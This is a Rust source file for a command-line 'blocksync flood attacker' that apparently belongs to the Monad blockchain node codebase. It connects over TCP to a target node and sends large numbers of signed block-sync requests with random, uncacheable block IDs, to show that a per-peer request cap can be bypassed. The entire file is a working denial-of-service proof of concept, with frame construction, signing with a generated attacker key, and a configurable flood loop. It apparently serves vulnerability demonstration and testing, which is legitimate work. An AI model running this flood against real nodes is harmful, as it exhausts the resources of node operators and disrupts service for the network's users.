// Copyright (C) 2025 Category Labs, Inc.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

//! Blocksync flood attacker binary.
//!
//! Connects via TCP to a running node and floods it with BlockSyncRequest
//! messages using random block IDs that won't be cached, to demonstrate that
//! the peer request table cap doesn't limit ledger fetch throughput.

use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

use alloy_rlp::{encode_list, Encodable};
use bytes::BytesMut;
use clap::Parser;
use monad_blocksync::messages::message::BlockSyncRequestMessage;
use monad_consensus_types::{
    block::BlockRange,
    payload::ConsensusBlockBodyId,
};
use monad_crypto::{hasher::Hash, signing_domain};
use monad_secp::KeyPair;
use monad_types::{BlockId, MonadVersion, SeqNum};
use rand::Rng;

/// TCP header magic: 0x434e5353 ("SSNC" in LE)
const HEADER_MAGIC: u32 = 0x434e5353;
/// TCP header version
const HEADER_VERSION: u32 = 1;
/// Signature size: 64-byte compact signature + 1-byte recovery ID
const SIGNATURE_SIZE: usize = 65;

/// RLP-compatible local replica of NetworkMessageVersion (private in monad-raptorcast).
/// Encodes identically: RLP list of [serialize_version: u32, compression_version: u8].
struct NetworkMessageVersion {
    serialize_version: u32,
    compression_version: u8,
}

impl Encodable for NetworkMessageVersion {
    fn encode(&self, out: &mut dyn bytes::BufMut) {
        let enc: [&dyn Encodable; 2] = [&self.serialize_version, &self.compression_version];
        encode_list::<_, dyn Encodable>(&enc, out);
    }
}

/// Wrapper that encodes a BlockSyncRequestMessage as a MonadMessage variant 2,
/// producing bytes identical to VerifiedMonadMessage::BlockSyncRequest.
struct MonadMessageEnvelope<'a> {
    monad_version: MonadVersion,
    msg: &'a BlockSyncRequestMessage,
}

impl Encodable for MonadMessageEnvelope<'_> {
    fn encode(&self, out: &mut dyn bytes::BufMut) {
        let variant: u8 = 2; // BlockSyncRequest
        let enc: [&dyn Encodable; 3] = [&self.monad_version, &variant, self.msg];
        encode_list::<_, dyn Encodable>(&enc, out);
    }
}

/// Serialize the full OutboundRouterMessage::AppMessage bytes (uncompressed).
fn serialize_app_message(request: &BlockSyncRequestMessage) -> BytesMut {
    let version = NetworkMessageVersion {
        serialize_version: 1,
        compression_version: 1, // UncompressedVersion
    };
    let msg_type: u8 = 1; // MESSAGE_TYPE_APP

    let envelope = MonadMessageEnvelope {
        monad_version: MonadVersion::version(),
        msg: request,
    };

    let mut buf = BytesMut::new();
    let enc: [&dyn Encodable; 3] = [&version, &msg_type, &envelope];
    encode_list::<_, dyn Encodable>(&enc, &mut buf);
    buf
}

/// Build a signed TCP frame: [16-byte header][65-byte sig][app_message_bytes]
fn build_tcp_frame(keypair: &KeyPair, app_message_bytes: &[u8]) -> Vec<u8> {
    let signature = keypair.sign::<signing_domain::RaptorcastAppMessage>(app_message_bytes);
    let sig_bytes = signature.serialize();

    let payload_len = SIGNATURE_SIZE + app_message_bytes.len();

    // TCP header: magic (4 LE) + version (4 LE) + length (8 LE) = 16 bytes
    let mut frame = Vec::with_capacity(16 + payload_len);
    frame.extend_from_slice(&HEADER_MAGIC.to_le_bytes());
    frame.extend_from_slice(&HEADER_VERSION.to_le_bytes());
    frame.extend_from_slice(&(payload_len as u64).to_le_bytes());
    frame.extend_from_slice(&sig_bytes);
    frame.extend_from_slice(app_message_bytes);
    frame
}

#[derive(Clone, Copy, Debug, clap::ValueEnum)]
enum Mode {
    /// Send BlockSyncRequestMessage::Headers with random BlockRange
    Headers,
    /// Send BlockSyncRequestMessage::Payload with random ConsensusBlockBodyId
    Payload,
}

#[derive(Parser)]
#[command(name = "monad-blocksync-flood")]
#[command(about = "Flood a node with blocksync requests to demonstrate peer request table cap bypass")]
struct Args {
    /// Target node TCP address (raptorcast port), e.g. 127.0.0.1:8000
    #[arg(long)]
    target: String,

    /// Number of requests to send
    #[arg(long, default_value_t = 1000)]
    count: u64,

    /// Delay between requests in milliseconds (0 = no delay)
    #[arg(long, default_value_t = 0)]
    delay_ms: u64,

    /// Request mode: headers or payload
    #[arg(long, value_enum, default_value_t = Mode::Payload)]
    mode: Mode,
}

fn random_hash(rng: &mut impl Rng) -> Hash {
    let mut bytes = [0u8; 32];
    rng.fill(&mut bytes);
    Hash(bytes)
}

fn main() {
    let args = Args::parse();
    let mut rng = rand::thread_rng();

    // Generate a random attacker identity
    // Use secp256k1's rand (0.9) for KeyPair::generate which requires its CryptoRng
    let keypair = KeyPair::generate(&mut secp256k1::rand::rng());
    let pubkey = keypair.pubkey();
    eprintln!("attacker pubkey: {:?}", pubkey);
    eprintln!(
        "connecting to {} (mode={:?}, count={}, delay_ms={})",
        args.target, args.mode, args.count, args.delay_ms
    );

    let mut stream = TcpStream::connect(&args.target).expect("failed to connect to target");
    stream
        .set_nodelay(true)
        .expect("failed to set TCP_NODELAY");

    let delay = if args.delay_ms > 0 {
        Some(Duration::from_millis(args.delay_ms))
    } else {
        None
    };

    let mut sent = 0u64;
    let mut errors = 0u64;

    for i in 0..args.count {
        let hash = random_hash(&mut rng);
        let request = match args.mode {
            Mode::Headers => BlockSyncRequestMessage::Headers(BlockRange {
                last_block_id: BlockId(hash),
                num_blocks: SeqNum(1),
            }),
            Mode::Payload => {
                BlockSyncRequestMessage::Payload(ConsensusBlockBodyId(hash))
            }
        };

        let app_bytes = serialize_app_message(&request);
        let frame = build_tcp_frame(&keypair, &app_bytes);

        match stream.write_all(&frame) {
            Ok(()) => {
                sent += 1;
                if i % 100 == 0 || i == args.count - 1 {
                    eprintln!(
                        "[{}/{}] sent {:?} request hash={:02x}{:02x}..{:02x}{:02x}",
                        i + 1,
                        args.count,
                        args.mode,
                        hash.0[0],
                        hash.0[1],
                        hash.0[30],
                        hash.0[31],
                    );
                }
            }
            Err(e) => {
                errors += 1;
                eprintln!("[{}/{}] write error: {}", i + 1, args.count, e);
                if errors > 10 {
                    eprintln!("too many errors, aborting");
                    break;
                }
            }
        }

        if let Some(d) = delay {
            thread::sleep(d);
        }
    }

    eprintln!("done: sent={}, errors={}", sent, errors);
}
